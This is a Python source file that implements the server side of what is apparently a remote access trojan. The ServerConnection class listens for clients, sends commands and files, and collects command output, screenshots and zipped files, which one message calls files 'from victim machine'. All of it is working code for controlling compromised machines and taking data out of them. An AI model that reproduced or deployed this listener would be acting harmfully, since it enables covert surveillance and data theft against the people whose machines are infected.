import socket
DELIMETER="<END_OF_RESULTS>"


class ServerConnection:
    def __init__(self):
        self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #to make new connections by default it will take system ip address
    def createConnections(self,ip="",port=8080):
        self.server_ip=ip
        self.server_port=port
        self.address=(self.server_ip,self.server_port)
        self.sock.bind(self.address)

    #to listen new connections
    def ListenConnections(self,backlog=5):
        self.sock.listen(backlog)
        print("waiting for clients")

    #to accept the connnections 
    def acceptConnections(self):
        self.client_conn,self.client_add=self.sock.accept()
        return self.client_conn,self.client_add

    #to send the data to the client by the server    
    def sendData(self,user_input):
        user_input_bytes=bytes(user_input,'utf-8')
        self.client_conn.send(user_input_bytes)
    #recive the data
    def receiveData(self):
        receivedata=self.client_conn.recv(4096)        
        self.data=receivedata.decode()
        return self.data
    #receive command results    
    def receive_command_result(self):
        print("[+] Getting Command results")
        result=b''
        while True:
            chunk=self.client_conn.recv(8048)
            if chunk.endswith(DELIMETER.encode()):
                chunk=chunk[:-len(DELIMETER)]
                result+=chunk
                break
            result+=chunk
        print(result.decode())    
    #send file
    def send_file(self,filename):
        print("[+] sending files ")
        with open(filename,'rb') as file:
            chunk=file.read(8024)
            while len(chunk)>0:
                self.client_conn.send(chunk)
                chunk=file.read(8024)
            self.client_conn.send(DELIMETER.encode())

    #receive the screenshot
    def receive_screenshot(self,filename):
   
        with open("1"+filename,'wb') as file:
            while True:
                chunk=self.client_conn.recv(8024)
                if chunk.endswith(DELIMETER.encode()):
                    chunk=chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)            
        print("[+] capturing complete")


    #receive zipped file name
    def receive_zip_file(self,filename):
        print("[+] receiving the files from victim machine")
        full_file=b''

        while True:
            chunk=self.client_conn.recv(8024)
            
            if chunk.endswith(DELIMETER.encode()):
                chunk=chunk[:-len(DELIMETER.encode())]
                full_file+=chunk
                break
            full_file+=chunk
            #write in files
        with open(filename,'wb') as file:
            file.write(full_file)
            file.close()
        print("file received successfully")


    #close
    def close(self):
        self.sock.close()